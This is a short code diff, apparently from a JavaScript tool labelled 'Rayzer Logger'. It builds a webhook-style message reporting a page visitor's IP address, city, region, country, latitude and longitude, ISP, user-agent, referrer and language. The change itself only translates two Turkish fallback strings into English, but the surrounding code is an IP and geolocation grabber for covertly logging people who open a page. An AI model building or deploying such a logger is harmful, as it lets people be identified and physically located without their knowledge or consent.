@@ -42,9 +42,9 @@
                             { name: "IP", value: `\`${ip}\``, inline: true },
                             { name: "Location", value: `${geo.city || "?"}, ${geo.regionName || "?"}, ${geo.country || "?"}`, inline: true },
                             { name: "Cords", value: `${geo.lat || "?"}, ${geo.lon || "?"}`, inline: true },
-                            { name: "ISP", value: geo.isp || "Bilinmiyor", inline: false },
+                            { name: "ISP", value: geo.isp || "Unknown", inline: false },
                             { name: "User-Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-                            { name: "Referer", value: document.referrer || "Yok", inline: false },
+                            { name: "Referer", value: document.referrer || "None", inline: false },
                             { name: "Language", value: navigator.language, inline: true }
                         ],
                         footer: { text: "Rayzer Logger" },
